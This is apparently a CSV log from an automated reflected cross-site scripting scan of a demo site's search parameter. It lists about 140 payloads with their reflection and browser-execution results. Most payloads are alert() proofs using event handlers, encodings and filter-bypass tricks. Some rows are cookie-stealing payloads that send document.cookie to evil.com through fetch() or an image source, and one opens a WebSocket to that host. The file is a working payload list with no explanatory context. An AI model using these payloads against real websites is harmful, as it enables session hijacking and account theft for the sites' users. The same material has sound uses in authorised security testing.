Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:58:46.393,2026-01-10 16:58:46.503,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.392,2026-01-10 16:58:46.506,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.386,2026-01-10 16:58:46.509,0.122,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.414,2026-01-10 16:58:46.519,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.426,2026-01-10 16:58:46.523,0.097,https://demo-knsl.onrender.com/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.469,2026-01-10 16:58:46.585,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.509,2026-01-10 16:58:46.612,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.503,2026-01-10 16:58:46.615,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.506,2026-01-10 16:58:46.620,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.519,2026-01-10 16:58:46.623,0.104,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.523,2026-01-10 16:58:46.636,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.585,2026-01-10 16:58:46.702,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.612,2026-01-10 16:58:46.736,0.124,https://demo-knsl.onrender.com/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.620,2026-01-10 16:58:46.739,0.119,https://demo-knsl.onrender.com/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.615,2026-01-10 16:58:46.741,0.126,https://demo-knsl.onrender.com/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.623,2026-01-10 16:58:46.743,0.120,https://demo-knsl.onrender.com/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.636,2026-01-10 16:58:46.771,0.134,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.702,2026-01-10 16:58:46.816,0.114,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.017,2026-01-10 16:58:46.846,0.829,https://demo-knsl.onrender.com/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:46.736,2026-01-10 16:58:46.847,0.111,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.741,2026-01-10 16:58:46.867,0.126,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.743,2026-01-10 16:58:46.870,0.127,https://demo-knsl.onrender.com/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.034,2026-01-10 16:58:46.897,0.863,https://demo-knsl.onrender.com/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:46.771,2026-01-10 16:58:46.897,0.127,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.846,2026-01-10 16:58:46.948,0.102,https://demo-knsl.onrender.com/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.847,2026-01-10 16:58:46.959,0.112,https://demo-knsl.onrender.com/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.867,2026-01-10 16:58:46.968,0.101,https://demo-knsl.onrender.com/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.870,2026-01-10 16:58:46.972,0.102,https://demo-knsl.onrender.com/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.897,2026-01-10 16:58:47.001,0.104,https://demo-knsl.onrender.com/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.897,2026-01-10 16:58:47.004,0.107,https://demo-knsl.onrender.com/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.186,2026-01-10 16:58:47.013,0.827,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:46.948,2026-01-10 16:58:47.059,0.111,https://demo-knsl.onrender.com/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.968,2026-01-10 16:58:47.076,0.108,https://demo-knsl.onrender.com/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.972,2026-01-10 16:58:47.102,0.129,https://demo-knsl.onrender.com/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.001,2026-01-10 16:58:47.105,0.104,https://demo-knsl.onrender.com/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.004,2026-01-10 16:58:47.107,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.013,2026-01-10 16:58:47.109,0.097,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.307,2026-01-10 16:58:47.150,0.844,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:47.059,2026-01-10 16:58:47.171,0.111,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.102,2026-01-10 16:58:47.201,0.099,https://demo-knsl.onrender.com/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.105,2026-01-10 16:58:47.208,0.103,https://demo-knsl.onrender.com/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.107,2026-01-10 16:58:47.211,0.104,https://demo-knsl.onrender.com/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.109,2026-01-10 16:58:47.226,0.117,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.150,2026-01-10 16:58:47.267,0.116,https://demo-knsl.onrender.com/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.171,2026-01-10 16:58:47.287,0.116,https://demo-knsl.onrender.com/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.201,2026-01-10 16:58:47.303,0.102,https://demo-knsl.onrender.com/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.208,2026-01-10 16:58:47.319,0.111,https://demo-knsl.onrender.com/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.211,2026-01-10 16:58:47.322,0.111,https://demo-knsl.onrender.com/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.226,2026-01-10 16:58:47.336,0.110,https://demo-knsl.onrender.com/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.267,2026-01-10 16:58:47.374,0.108,https://demo-knsl.onrender.com/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.287,2026-01-10 16:58:47.389,0.102,https://demo-knsl.onrender.com/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.322,2026-01-10 16:58:47.432,0.110,https://demo-knsl.onrender.com/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.319,2026-01-10 16:58:47.438,0.119,https://demo-knsl.onrender.com/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.303,2026-01-10 16:58:47.440,0.137,https://demo-knsl.onrender.com/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.336,2026-01-10 16:58:47.442,0.106,https://demo-knsl.onrender.com/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.739,2026-01-10 16:58:47.480,0.741,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:47.374,2026-01-10 16:58:47.505,0.130,https://demo-knsl.onrender.com/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.816,2026-01-10 16:58:47.540,0.723,https://demo-knsl.onrender.com/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:47.438,2026-01-10 16:58:47.541,0.103,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.442,2026-01-10 16:58:47.548,0.106,https://demo-knsl.onrender.com/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.432,2026-01-10 16:58:47.556,0.124,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.480,2026-01-10 16:58:47.590,0.110,https://demo-knsl.onrender.com/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.505,2026-01-10 16:58:47.625,0.120,https://demo-knsl.onrender.com/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.540,2026-01-10 16:58:47.659,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.541,2026-01-10 16:58:47.678,0.137,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.556,2026-01-10 16:58:47.682,0.126,https://demo-knsl.onrender.com/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:46.959,2026-01-10 16:58:47.685,0.726,https://demo-knsl.onrender.com/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:47.548,2026-01-10 16:58:47.687,0.139,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.440,2026-01-10 16:58:47.689,0.249,https://demo-knsl.onrender.com/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.625,2026-01-10 16:58:47.773,0.148,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.678,2026-01-10 16:58:47.798,0.120,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.685,2026-01-10 16:58:47.798,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.076,2026-01-10 16:58:47.803,0.727,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:58:47.687,2026-01-10 16:58:47.803,0.116,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.689,2026-01-10 16:58:47.808,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.773,2026-01-10 16:58:47.891,0.117,https://demo-knsl.onrender.com/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.798,2026-01-10 16:58:47.909,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.803,2026-01-10 16:58:47.913,0.110,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.803,2026-01-10 16:58:47.918,0.115,https://demo-knsl.onrender.com/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.659,2026-01-10 16:58:47.920,0.261,https://demo-knsl.onrender.com/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.798,2026-01-10 16:58:47.921,0.124,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.682,2026-01-10 16:58:47.922,0.241,https://demo-knsl.onrender.com/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.808,2026-01-10 16:58:47.924,0.116,https://demo-knsl.onrender.com/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.891,2026-01-10 16:58:48.011,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.922,2026-01-10 16:58:48.038,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.922,2026-01-10 16:58:48.038,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.909,2026-01-10 16:58:48.042,0.133,https://demo-knsl.onrender.com/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.920,2026-01-10 16:58:48.045,0.126,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.924,2026-01-10 16:58:48.048,0.124,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.011,2026-01-10 16:58:48.133,0.122,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.389,2026-01-10 16:58:48.142,0.753,https://demo-knsl.onrender.com/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,No,,High
2026-01-10 16:58:48.038,2026-01-10 16:58:48.176,0.137,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.042,2026-01-10 16:58:48.181,0.139,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.048,2026-01-10 16:58:48.185,0.137,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.918,2026-01-10 16:58:48.197,0.279,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.045,2026-01-10 16:58:48.197,0.152,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.913,2026-01-10 16:58:48.209,0.296,https://demo-knsl.onrender.com/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.133,2026-01-10 16:58:48.260,0.127,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.142,2026-01-10 16:58:48.285,0.143,https://demo-knsl.onrender.com/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.176,2026-01-10 16:58:48.287,0.111,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.185,2026-01-10 16:58:48.290,0.105,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.038,2026-01-10 16:58:48.300,0.262,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:47.590,2026-01-10 16:58:48.330,0.740,https://demo-knsl.onrender.com/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,No,,High
2026-01-10 16:58:48.197,2026-01-10 16:58:48.342,0.145,https://demo-knsl.onrender.com/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.197,2026-01-10 16:58:48.342,0.145,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.290,2026-01-10 16:58:48.355,0.065,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
2026-01-10 16:58:48.342,2026-01-10 16:58:48.409,0.067,https://demo-knsl.onrender.com/search,GET,q,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:58:48.285,2026-01-10 16:58:48.411,0.126,https://demo-knsl.onrender.com/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.300,2026-01-10 16:58:48.417,0.117,https://demo-knsl.onrender.com/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.330,2026-01-10 16:58:48.422,0.092,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.342,2026-01-10 16:58:48.458,0.116,https://demo-knsl.onrender.com/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.355,2026-01-10 16:58:48.461,0.106,https://demo-knsl.onrender.com/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.411,2026-01-10 16:58:48.502,0.090,https://demo-knsl.onrender.com/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
2026-01-10 16:58:48.409,2026-01-10 16:58:48.542,0.134,https://demo-knsl.onrender.com/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.422,2026-01-10 16:58:48.545,0.124,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.417,2026-01-10 16:58:48.551,0.134,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.458,2026-01-10 16:58:48.559,0.102,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.461,2026-01-10 16:58:48.573,0.112,https://demo-knsl.onrender.com/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.260,2026-01-10 16:58:48.601,0.341,https://demo-knsl.onrender.com/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.502,2026-01-10 16:58:48.602,0.100,https://demo-knsl.onrender.com/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.551,2026-01-10 16:58:48.663,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.545,2026-01-10 16:58:48.667,0.121,https://demo-knsl.onrender.com/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.559,2026-01-10 16:58:48.673,0.114,https://demo-knsl.onrender.com/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.573,2026-01-10 16:58:48.676,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.602,2026-01-10 16:58:48.721,0.119,https://demo-knsl.onrender.com/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.601,2026-01-10 16:58:48.724,0.123,https://demo-knsl.onrender.com/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.667,2026-01-10 16:58:48.772,0.105,https://demo-knsl.onrender.com/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.542,2026-01-10 16:58:48.774,0.231,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.663,2026-01-10 16:58:48.775,0.113,https://demo-knsl.onrender.com/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.673,2026-01-10 16:58:48.777,0.104,https://demo-knsl.onrender.com/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.676,2026-01-10 16:58:48.789,0.113,https://demo-knsl.onrender.com/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.721,2026-01-10 16:58:48.828,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.775,2026-01-10 16:58:48.886,0.111,https://demo-knsl.onrender.com/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.777,2026-01-10 16:58:48.889,0.113,https://demo-knsl.onrender.com/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.774,2026-01-10 16:58:48.891,0.118,https://demo-knsl.onrender.com/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.789,2026-01-10 16:58:48.893,0.105,https://demo-knsl.onrender.com/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.772,2026-01-10 16:58:48.895,0.123,https://demo-knsl.onrender.com/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.181,2026-01-10 16:58:48.930,0.749,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:58:48.209,2026-01-10 16:58:48.974,0.765,https://demo-knsl.onrender.com/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,No,,High
2026-01-10 16:58:48.828,2026-01-10 16:58:48.977,0.149,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.895,2026-01-10 16:58:48.981,0.085,https://demo-knsl.onrender.com/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 16:58:48.891,2026-01-10 16:58:49.009,0.118,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:48.893,2026-01-10 16:58:49.020,0.127,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
